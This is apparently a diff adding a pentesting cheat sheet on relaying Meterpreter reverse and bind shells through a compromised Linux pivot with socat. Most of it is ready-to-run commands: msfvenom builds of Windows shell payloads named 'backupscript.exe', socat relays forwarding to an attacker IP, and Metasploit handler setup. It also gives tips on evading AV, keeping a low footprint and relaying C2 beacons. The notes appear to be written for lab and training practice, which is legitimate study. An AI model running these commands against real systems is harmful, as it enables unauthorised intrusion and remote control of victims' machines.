@@ -1,0 +1,165 @@
+🧬 SOCAT REVERSE SHELL REDIRECTION (Pivot via Reverse Proxy)
+🎯 Use Case
+Redirect a reverse shell payload through a pivot (Ubuntu) host to your attacking machine.
+
+🧱 Setup Flow
+1. Start SOCAT Redirector on the Pivot (Ubuntu)
+bash
+Copy
+Edit
+socat TCP4-LISTEN:8080,fork TCP4:<YOUR_IP>:80
+Listens on 8080 on the pivot box
+
+Forwards to your attacker listener on port 80
+
+2. Create Payload That Connects to Pivot
+bash
+Copy
+Edit
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
+This tells Windows to connect back to Ubuntu’s 8080, which socat then redirects to you
+
+3. Start Metasploit Listener
+bash
+Copy
+Edit
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 80
+run
+4. Execute Payload on Windows Target
+You receive the session on port 80 → redirected via Ubuntu → through SOCAT
+
+🧬 SOCAT BIND SHELL REDIRECTION (Pivot via Bind Proxy)
+🎯 Use Case
+You’ve got RCE or code exec on Windows, but you can’t directly reach it. So, bind a shell on Windows, then connect through a SOCAT proxy on the pivot.
+
+🧱 Setup Flow
+1. Create Windows Bind Payload
+bash
+Copy
+Edit
+msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o backupscript.exe
+This listens on the Windows box on port 8443
+
+2. Start SOCAT Listener on Ubuntu (Pivot)
+bash
+Copy
+Edit
+socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+Ubuntu listens on 8080 and forwards to Windows:8443
+
+3. Start Metasploit Bind Handler
+bash
+Copy
+Edit
+use exploit/multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set RHOST <Ubuntu IP>
+set LPORT 8080
+run
+Your attacking box connects to Ubuntu:8080
+
+SOCAT forwards it to Windows:8443
+
+🧠 Key Differences (Reverse vs Bind)
+Feature	Reverse Shell	Bind Shell
+Who initiates connection?	Target (Windows) connects out	Attacker connects into the target
+Common Use Case	When the target can reach you	When you can’t reach the target directly
+Needs port open on target	❌ No	✅ Yes (bind port must be open on target)
+Pivot Involvement	Forward incoming shell via SOCAT	Forward outgoing bind handler via SOCAT
+🔫 Quick One-Liners
+SOCAT Reverse Redirector on Pivot:
+bash
+Copy
+Edit
+socat TCP4-LISTEN:8080,fork TCP4:<YOUR_IP>:80
+SOCAT Bind Redirector on Pivot:
+bash
+Copy
+Edit
+socat TCP4-LISTEN:8080,fork TCP4:<WINDOWS_IP>:8443
+MSF Bind Handler:
+bash
+Copy
+Edit
+use exploit/multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set RHOST <Ubuntu IP>
+set LPORT 8080
+run
+
+🔧 When to Use SOCAT in Pentesting
+✅ 1. You Don’t Want to Use SSH or Can’t
+SSH might be blocked, disabled, or not allowed in the environment.
+
+You have reverse shell access only — no interactive SSH creds or no SSH server running.
+
+You're in a weird lab like HTB/AEN with no password/SSH access but still want to forward or redirect stuff.
+
+➡️ SOCAT lets you tunnel or relay without SSH.
+
+✅ 2. You Want a Quick, Dirty Redirector (Reverse or Bind)
+Pivot box already compromised (Linux), and you just want to:
+
+Catch a shell from another host (reverse)
+
+Connect to a bind shell listener (bind)
+
+Think of it like: “I don’t want to upload or setup SSH keys or Meterpreter junk. I just want packets to bounce through this thing.”
+
+➡️ SOCAT is portable, tiny, flexible AF.
+
+✅ 3. You Want Port Forwarding Without Meterpreter/Proxychains
+Meterpreter might be unstable, AV’d, or you’re avoiding it for OPSEC.
+
+Proxychains and SOCKS tunnel stuff may be unreliable or blocked.
+
+➡️ SOCAT lets you say:
+
+bash
+Copy
+Edit
+listen_here --> forward_to_there
+...with just one command.
+
+✅ 4. You’re Setting Up a C2 Listener / Beacon Relay
+Have a Cobalt Strike/Metasploit listener and need a pivot to bounce through?
+
+SOCAT can sit on the pivot and forward traffic into your real handler.
+
+✅ 5. You’re In a Minimal, BusyBox, or Tiny Linux Shell
+You don’t have Python, SSH, netcat… but you DO have socat.
+
+Super common on routers, embedded devices, or hardened appliances.
+
+➡️ In those cases: socat = Swiss army knife.
+
+✅ 6. You’re Pivoting Through a Machine You Don’t Fully Control
+Maybe you got a shell but no root — can’t install anything.
+
+You upload a static socat binary, run it in your user space, and use it to forward traffic.
+
+➡️ No need to touch system services. No setup. Just run and bounce.
+
+🚫 When Not to Bother with SOCAT
+If you already have SSH and can do -L, -D, or -R forwarding, that’s easier.
+
+If you already have stable Meterpreter, use built-in portfwd or socks_proxy.
+
+If proxychains and socks tunnels are solid, they're usually smoother for bulk scanning.
+
+⚔️ TL;DR: SOCAT is your friend when:
+pgsql
+Copy
+Edit
+❌ No SSH
+❌ No Meterpreter
+✅ You have shell access
+✅ Need simple, fast, tool-free redirection
+✅ Want low-footprint pivoting
+
+
+
+ 
